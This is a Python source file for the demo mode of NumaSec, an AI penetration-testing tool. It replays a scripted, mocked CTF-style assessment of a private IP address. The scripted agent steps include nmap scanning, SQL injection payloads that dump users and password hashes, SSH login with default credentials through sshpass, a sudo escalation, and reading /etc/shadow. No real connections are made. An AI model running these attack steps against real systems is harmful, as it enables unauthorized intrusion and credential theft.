"""
NumaSec v3 — Demo Mode

Mocked replay of a realistic assessment.
Works without API keys, Docker, or a real target.

Usage:
    numasec --demo
    /demo (inside CLI)
"""

from __future__ import annotations

import asyncio
import time

from rich.console import Console
from rich.text import Text

from numasec.renderer import StreamRenderer
from numasec.state import Finding

try:
    from numasec.theme import (
        CYBERPUNK_THEME,
        MATRIX_GREEN,
        CYBER_PURPLE,
        ELECTRIC_CYAN,
        GHOST_GRAY,
        HACK_RED,
        GOLD,
        CyberpunkAssets,
    )
except ImportError:
    CYBERPUNK_THEME = None
    MATRIX_GREEN = "green"
    CYBER_PURPLE = "magenta"
    ELECTRIC_CYAN = "cyan"
    GHOST_GRAY = "bright_black"
    HACK_RED = "red"
    GOLD = "yellow"
    CyberpunkAssets = None


# ═══════════════════════════════════════════════════════════════════════════
# Demo Script — a realistic CTF-style assessment
# ═══════════════════════════════════════════════════════════════════════════

TARGET = "http://10.10.14.7:8080"

# Each step: (type, delay_before, **kwargs)
# Types: text, tool_start, tool_end, finding, usage, phase, plan

DEMO_SCRIPT: list[dict] = [
    # ── Opening analysis ──
    {"type": "text", "delay": 0.02, "content": "Analyzing target "},
    {"type": "text", "delay": 0.02, "content": TARGET},
    {"type": "text", "delay": 0.02, "content": "... I'll start with reconnaissance to map the attack surface, then probe for vulnerabilities.\n\n"},

    # ── Phase: RECON ──
    {"type": "plan", "delay": 0.3, "content": (
        "Attack Plan\n"
        "[ ] Phase 1: RECON — Map the attack surface\n"
        "    Objective: Enumerate ports, endpoints, technologies\n"
        "[ ] Phase 2: EXPLOIT — Test confirmed vulnerabilities\n"
        "    Objective: Achieve code execution or data access\n"
        "[ ] Phase 3: POST-EXPLOIT — Escalate and pivot\n"
        "    Objective: Full system compromise"
    )},

    # Tool 1: Nmap
    {"type": "tool_start", "delay": 0.4, "name": "run_command",
     "args": {"command": "nmap -sV -sC -p- 10.10.14.7", "timeout": 60}},
    {"type": "tool_end", "delay": 1.2, "name": "run_command",
     "result": '{"stdout": "PORT     STATE SERVICE  VERSION\\n22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu\\n80/tcp   open  http     Apache 2.4.41\\n3306/tcp open  mysql    MySQL 5.7.38\\n8080/tcp open  http     Werkzeug 2.1.2 (Python 3.8.10)\\n\\nService Info: OS: Linux", "stderr": "", "exit_code": 0}'},

    {"type": "text", "delay": 0.02, "content": "Found 4 open ports. Port 8080 is a Python Werkzeug app — "},
    {"type": "text", "delay": 0.02, "content": "high priority target. Let me enumerate endpoints.\n\n"},

    # Tool 2: Directory brute
    {"type": "tool_start", "delay": 0.3, "name": "http_request",
     "args": {"method": "GET", "url": f"{TARGET}/robots.txt"}},
    {"type": "tool_end", "delay": 0.6, "name": "http_request",
     "result": '{"status_code": 200, "body": "User-agent: *\\nDisallow: /admin\\nDisallow: /api/debug\\nDisallow: /console"}'},

    {"type": "text", "delay": 0.02, "content": "Interesting — `/admin`, `/api/debug`, and `/console` exposed in robots.txt. "},
    {"type": "text", "delay": 0.02, "content": "The `/console` path suggests a Werkzeug debug console. Let me check.\n\n"},

    # Tool 3: Check console
    {"type": "tool_start", "delay": 0.3, "name": "http_request",
     "args": {"method": "GET", "url": f"{TARGET}/console"}},
    {"type": "tool_end", "delay": 0.5, "name": "http_request",
     "result": '{"status_code": 200, "body": "<title>Werkzeug Debugger</title>\\n<p>The debugger is active and allows code execution.</p>"}'},

    {"type": "text", "delay": 0.02, "content": "**Werkzeug debugger is exposed and unprotected.** This is a critical finding — it allows arbitrary Python code execution on the server.\n\n"},

    # Finding 1
    {"type": "finding", "delay": 0.1, "finding": Finding(
        title="Werkzeug Debug Console — Unauthenticated RCE",
        severity="critical",
        description="Werkzeug debugger is exposed at /console without authentication. An attacker can execute arbitrary Python code on the server, leading to full system compromise. Remediation: Disable debug mode in production (FLASK_DEBUG=0).",
        evidence=f"GET {TARGET}/console → 200 OK with active debugger",
    )},

    # Usage after first batch
    {"type": "usage", "delay": 0.1, "input_tokens": 2847, "output_tokens": 412},

    # ── Phase transition ──
    {"type": "phase", "delay": 0.5, "completed": "RECON", "next": "EXPLOIT"},

    # Tool 4: SQLi check
    {"type": "text", "delay": 0.02, "content": "Moving to exploitation. Let me test the `/api/debug` endpoint for SQL injection.\n\n"},

    {"type": "tool_start", "delay": 0.3, "name": "http_request",
     "args": {"method": "GET", "url": f"{TARGET}/api/debug?id=1' OR '1'='1"}},
    {"type": "tool_end", "delay": 0.7, "name": "http_request",
     "result": '{"status_code": 200, "body": "[{\\"id\\": 1, \\"username\\": \\"admin\\", \\"email\\": \\"admin@internal.htb\\", \\"role\\": \\"superadmin\\"}, {\\"id\\": 2, \\"username\\": \\"dev\\", \\"email\\": \\"dev@internal.htb\\", \\"role\\": \\"developer\\"}, {\\"id\\": 3, \\"username\\": \\"test\\", \\"email\\": \\"test@internal.htb\\", \\"role\\": \\"user\\"}]"}'},

    {"type": "text", "delay": 0.02, "content": "SQL injection confirmed. The API returns all user records with a basic boolean-based payload. "},
    {"type": "text", "delay": 0.02, "content": "Let me extract password hashes.\n\n"},

    # Finding 2
    {"type": "finding", "delay": 0.1, "finding": Finding(
        title="SQL Injection in /api/debug",
        severity="critical",
        description="Boolean-based blind SQL injection in the `id` parameter allows full database extraction including user credentials. Remediation: Use parameterized queries.",
        evidence=f"GET {TARGET}/api/debug?id=1' OR '1'='1 → dumps all users",
    )},

    # Tool 5: Extract passwords
    {"type": "tool_start", "delay": 0.3, "name": "http_request",
     "args": {"method": "GET", "url": f"{TARGET}/api/debug?id=1' UNION SELECT username,password,3,4 FROM users--"}},
    {"type": "tool_end", "delay": 0.8, "name": "http_request",
     "result": '{"status_code": 200, "body": "[{\\"id\\": \\"admin\\", \\"username\\": \\"$2b$12$LJ3m4ys3Qr2kX8fV7w.mYOqdz2Dj3Pz.Kn1hXxHR7N5C6TdxqR0e\\", \\"email\\": \\"3\\", \\"role\\": \\"4\\"}]"}'},

    {"type": "text", "delay": 0.02, "content": "Got bcrypt hash for admin: `$2b$12$LJ3m4...`. "},
    {"type": "text", "delay": 0.02, "content": "Let me try default credentials on SSH and the admin panel simultaneously.\n\n"},

    # Usage
    {"type": "usage", "delay": 0.1, "input_tokens": 5193, "output_tokens": 687},

    # Tool 6: SSH attempt
    {"type": "tool_start", "delay": 0.3, "name": "run_command",
     "args": {"command": "sshpass -p 'admin123' ssh -o StrictHostKeyChecking=no admin@10.10.14.7 'id && whoami'"}},
    {"type": "tool_end", "delay": 1.0, "name": "run_command",
     "result": '{"stdout": "uid=1000(admin) gid=1000(admin) groups=1000(admin),27(sudo)\\nadmin", "stderr": "", "exit_code": 0}'},

    {"type": "text", "delay": 0.02, "content": "**SSH access achieved** with `admin:admin123`. The user is in the sudo group — "},
    {"type": "text", "delay": 0.02, "content": "let me check for privilege escalation.\n\n"},

    # Finding 3
    {"type": "finding", "delay": 0.1, "finding": Finding(
        title="Weak Credentials — SSH Root Access",
        severity="high",
        description="Default credentials admin:admin123 grant SSH access with sudo group membership, enabling full root escalation. Remediation: Enforce strong password policies and key-based auth.",
        evidence="sshpass -p 'admin123' ssh admin@10.10.14.7 → uid=1000(admin) groups=sudo",
    )},

    # ── Phase transition ──
    {"type": "phase", "delay": 0.5, "completed": "EXPLOIT", "next": "POST-EXPLOIT"},

    # Tool 7: Privesc
    {"type": "tool_start", "delay": 0.3, "name": "run_command",
     "args": {"command": "sshpass -p 'admin123' ssh admin@10.10.14.7 'sudo -l'"}},
    {"type": "tool_end", "delay": 0.6, "name": "run_command",
     "result": '{"stdout": "User admin may run the following commands on target:\\n    (ALL : ALL) NOPASSWD: ALL", "stderr": "", "exit_code": 0}'},

    {"type": "text", "delay": 0.02, "content": "`sudo NOPASSWD: ALL` — full root access without additional authentication. "},
    {"type": "text", "delay": 0.02, "content": "This machine is fully compromised.\n\n"},

    # Tool 8: Read flag / sensitive data
    {"type": "tool_start", "delay": 0.3, "name": "run_command",
     "args": {"command": "sshpass -p 'admin123' ssh admin@10.10.14.7 'sudo cat /root/flag.txt'"}},
    {"type": "tool_end", "delay": 0.5, "name": "run_command",
     "result": '{"stdout": "FLAG{n0_d3bug_1n_pr0d_pl34s3}", "stderr": "", "exit_code": 0}'},

    {"type": "text", "delay": 0.02, "content": "Root flag captured: `FLAG{n0_d3bug_1n_pr0d_pl34s3}`\n\n"},

    # Tool 9: Check for sensitive files
    {"type": "tool_start", "delay": 0.3, "name": "run_command",
     "args": {"command": "sshpass -p 'admin123' ssh admin@10.10.14.7 'sudo cat /etc/shadow | head -3'"}},
    {"type": "tool_end", "delay": 0.4, "name": "run_command",
     "result": '{"stdout": "root:$6$rounds=656000$abc$xyz...hash:19000:0:99999:7:::\\ndaemon:*:19000:0:99999:7:::\\nbin:*:19000:0:99999:7:::", "stderr": "", "exit_code": 0}'},

    # Finding 4
    {"type": "finding", "delay": 0.1, "finding": Finding(
        title="Sudo NOPASSWD Misconfiguration",
        severity="high",
        description="admin user has unrestricted sudo access without password requirement (NOPASSWD: ALL), enabling instant root escalation. Remediation: Apply principle of least privilege.",
        evidence="sudo -l → (ALL : ALL) NOPASSWD: ALL",
    )},

    # Finding 5
    {"type": "finding", "delay": 0.1, "finding": Finding(
        title="Exposed robots.txt Reveals Internal Paths",
        severity="low",
        description="robots.txt exposes sensitive internal paths including /admin, /api/debug, and /console. Remediation: Remove or restrict robots.txt in production.",
        evidence=f"GET {TARGET}/robots.txt → Disallow: /admin, /api/debug, /console",
    )},

    # Final usage
    {"type": "usage", "delay": 0.1, "input_tokens": 8421, "output_tokens": 1253},

    # ── Phase transition: done ──
    {"type": "phase", "delay": 0.5, "completed": "POST-EXPLOIT", "next": ""},

    {"type": "text", "delay": 0.02, "content": "Assessment complete. Full system compromise achieved through three attack chains:\n"},
    {"type": "text", "delay": 0.02, "content": "1. Werkzeug debug console → RCE\n"},
    {"type": "text", "delay": 0.02, "content": "2. SQL injection → credential extraction\n"},
    {"type": "text", "delay": 0.02, "content": "3. Default credentials → SSH → sudo root\n\n"},
]


# ═══════════════════════════════════════════════════════════════════════════
# Demo Runner
# ═══════════════════════════════════════════════════════════════════════════


async def run_demo(console: Console | None = None):
    """
    Run the full NumaSec demo.

    Replays a mocked assessment with realistic timing.
    No API keys, no Docker, no real target needed.
    """
    if console is None:
        console = Console(theme=CYBERPUNK_THEME if CYBERPUNK_THEME else None)

    renderer = StreamRenderer(console)
    tool_number = 0
    current_args = {}
    findings: list[Finding] = []
    demo_start = time.monotonic()

    # ── Banner ──
    if CyberpunkAssets:
        console.clear()
        console.print(CyberpunkAssets.MATRIX_BANNER)

    console.print()
    console.print(f"  [{GHOST_GRAY}]demo mode — no real connections are made[/]")
    console.print()

    # ── Target acquired ──
    renderer.target_acquired(TARGET)

    # ── Replay script ──
    for step in DEMO_SCRIPT:
        delay = step.get("delay", 0.05)
        await asyncio.sleep(delay)

        if step["type"] == "text":
            # Simulate character-by-character streaming
            content = step["content"]
            chunk_size = 3  # chars per tick
            for i in range(0, len(content), chunk_size):
                renderer.stream_text(content[i:i + chunk_size])
                await asyncio.sleep(0.008)

        elif step["type"] == "tool_start":
            tool_number += 1
            current_args = step.get("args", {})
            renderer.tool_start(step["name"], current_args, tool_number=tool_number)

        elif step["type"] == "tool_end":
            renderer.tool_result(step["name"], step.get("result", ""), current_args)
            current_args = {}

        elif step["type"] == "finding":
            finding = step["finding"]
            findings.append(finding)
            renderer.finding(finding)

        elif step["type"] == "usage":
            renderer.usage(
                step.get("input_tokens", 0),
                step.get("output_tokens", 0),
                step.get("cache_read", 0),
            )

        elif step["type"] == "phase":
            renderer.phase_transition(step["completed"], step.get("next", ""))

        elif step["type"] == "plan":
            content = step["content"]
            console.print(f"\n  [{CYBER_PURPLE}]◆ ATTACK PLAN[/]")
            for raw_line in content.split("\n"):
                line = raw_line.strip()
                if not line:
                    continue
                line = line.lstrip("# ").strip()
                line = line.replace("**", "")
                if line.startswith("[ ] "):
                    console.print(f"    [{ELECTRIC_CYAN}]○ {line[4:]}[/]")
                elif line.startswith("[x] ") or line.startswith("[X] "):
                    console.print(f"    [{MATRIX_GREEN}]✓ {line[4:]}[/]")
                elif line.lower().startswith("objective:"):
                    console.print(f"        [{GHOST_GRAY}]{line}[/]")
                elif "attack plan" in line.lower():
                    console.print(f"    [{GHOST_GRAY}]{line}[/]")
                else:
                    console.print(f"    [{GHOST_GRAY}]{line}[/]")
            console.print()

    renderer.end_stream()

    # ── Assessment complete card ──
    duration = time.monotonic() - demo_start
    total_cost = 0.0032  # Simulated cost (~$0.003 for DeepSeek)

    renderer.assessment_complete(
        target=TARGET,
        duration_s=duration,
        cost=total_cost,
        findings=findings,
        tools_used=tool_number,
    )

    # ── Demo outro ──
    console.print()
    console.print(f"  [{GHOST_GRAY}]This was a demo replay — no real systems were targeted.[/]")
    console.print(f"  [{MATRIX_GREEN}]Install: pip install numasec[/]")
    console.print(f"  [{GHOST_GRAY}]GitHub:  https://github.com/FrancescoStabile/numasec[/]")
    console.print()


def main_demo():
    """Sync entry point for `numasec --demo`."""
    try:
        asyncio.run(run_demo())
    except KeyboardInterrupt:
        print("\n\nDemo interrupted.")
